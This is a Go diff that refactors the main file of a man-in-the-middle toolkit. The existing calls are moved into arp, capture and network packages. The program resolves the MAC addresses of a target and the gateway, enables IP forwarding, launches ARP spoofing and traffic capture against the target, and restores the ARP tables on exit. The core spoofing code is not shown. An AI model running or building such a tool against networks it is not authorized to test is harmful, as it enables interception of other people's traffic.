@@ -7,6 +7,10 @@ import (
 	"os/exec"
 	"os/signal"
 	"syscall"
+
+	"mitm-toolkit/arp"
+	"mitm-toolkit/capture"
+	"mitm-toolkit/network"
 )
 
 func main() {
@@ -38,19 +42,19 @@ func main() {
 	fmt.Printf("Target IP address: %v\n", targetIP)
 
 	// Get local network information
-	localNetwork, err := GetLocalNetworkInfo()
+	localNetwork, err := network.GetLocalNetworkInfo()
 	if err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
 	}
 
 	fmt.Printf("\nAttacker Information:\n")
-	fmt.Printf("  Interface: %s\n", localNetwork.interfaceName)
-	fmt.Printf("  IP Address: %s\n", localNetwork.ipv4Address)
-	fmt.Printf("  MAC Address: %s\n", localNetwork.macAddress)
+	fmt.Printf("  Interface: %s\n", localNetwork.InterfaceName)
+	fmt.Printf("  IP Address: %s\n", localNetwork.IPv4Address)
+	fmt.Printf("  MAC Address: %s\n", localNetwork.MacAddress)
 
 	// Get gateway information
-	gatewayIP, err := GetNetworkGateway()
+	gatewayIP, err := network.GetNetworkGateway()
 	if err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
@@ -60,7 +64,7 @@ func main() {
 	fmt.Printf("  Gateway IP: %s\n", gatewayIP)
 
 	// Get target MAC address via ARP
-	targetMAC, err := GetMACFromIP(targetIP, localNetwork)
+	targetMAC, err := network.GetMACFromIP(targetIP, localNetwork)
 	if err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
@@ -68,14 +72,14 @@ func main() {
 	fmt.Printf("\nTarget MAC Address: %s\n", targetMAC)
 
 	// Get gateway MAC address via ARP
-	gatewayMAC, err := GetMACFromIP(gatewayIP, localNetwork)
+	gatewayMAC, err := network.GetMACFromIP(gatewayIP, localNetwork)
 	if err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
 	}
 	fmt.Printf("Gateway MAC Address: %s\n", gatewayMAC)
 
-	if err := EnableIPForwarding(); err != nil {
+	if err := arp.EnableIPForwarding(); err != nil {
 		fmt.Printf("Error: %v\n", err)
 		os.Exit(1)
 	}
@@ -84,8 +88,8 @@ func main() {
 	fmt.Println("Press Ctrl+C to stop and restore ARP tables.")
 	fmt.Println() // Empty line before traffic output
 
-	go StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
-	go StartCapture(localNetwork, targetIP)
+	go arp.StartARPSpoofing(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
+	go capture.StartCapture(localNetwork, targetIP)
 
 	// Block until ctrl+c signal to exit
 	sigChan := make(chan os.Signal, 1)
@@ -94,6 +98,6 @@ func main() {
 
 	//Cleanup
 	fmt.Println("\nRestoring ARP tables...")
-	RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
+	arp.RestoreARP(localNetwork, targetIP, targetMAC, gatewayIP, gatewayMAC)
 
 }
